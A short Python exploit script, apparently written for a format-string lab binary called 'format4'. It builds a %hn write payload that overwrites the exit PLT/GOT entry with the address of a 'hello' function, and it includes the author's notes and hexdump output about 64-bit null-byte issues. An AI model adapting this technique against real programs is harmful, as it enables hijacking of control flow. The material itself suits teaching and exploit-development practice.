import struct

HELLO = 0x400676

EXIT_PLT = 0x601040


def pad(s):
	return s+"X"*(512-len(s)-16)

exploit = ""


exploit+= "AAAACCCC" #len == 8
#exploit+= " %p" *16 # 1.to find stack new stack offset, here we dont get any result in gdb
#exploit+= "%p"*100
exploit+= "%{}x".format(0x676-len(exploit))
#exploit+= "%68$p" #at level 68 we find the offset of 0x601040
exploit+= "%68$hn" #hn to write the characterfor 64bit
exploit= pad(exploit)

exploit+= struct.pack("Q", EXIT_PLT)
exploit+= struct.pack("Q", EXIT_PLT+2)

print(pad(exploit))

'''
1.cat exp |./format4 | hexdump -C
 00000000  40 10 60                                          |@.`|
 00000003
*beacuse we reveice x00 after three bytes and printf stops in null bytes.

1.kernel@ubuntu:~/format$ cat exp | hexdump -C
00000000  40 10 60 00 42 10 60 00  41 41 41 41 43 43 43 43  |@.`.B.`.AAAACCCC|
00000010  20 25 70 20 25 70 20 25  70 20 25 70 20 25 70 20  | %p %p %p %p %p |
00000020  25 70 20 25 70 20 25 70  20 25 70 20 25 70 20 25  |%p %p %p %p %p %|
00000030  70 20 25 70 20 25 70 20  25 70 20 25 70 20 25 70  |p %p %p %p %p %p|
00000040  58 58 58 58 58 58 58 58  58 58 58 58 58 58 58 58  |XXXXXXXXXXXXXXXX|
*
00000200  0a                                                |.|
00000201

There is no issue in 32bytes as we only have bytes and no null bytes.
In 64bit hte default addres is 3bytes. so move the addresses atthe end of our exploit
#exploit+= struct.pack("I", EXIT_PLT)
#exploit+= struct.pack("I", EXIT_PLT+2)
'''